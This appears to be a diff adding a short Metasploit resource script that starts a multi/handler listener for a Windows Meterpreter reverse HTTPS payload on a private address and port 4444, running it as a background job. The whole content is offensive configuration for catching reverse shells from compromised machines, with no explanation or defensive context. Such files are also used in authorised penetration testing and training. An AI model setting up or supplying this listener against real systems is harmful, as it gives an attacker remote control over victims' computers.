@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set LHOST 192.168.1.117
+set PAYLOAD windows/meterpreter/reverse_https
+set LPORT 4444
+exploit -j -z
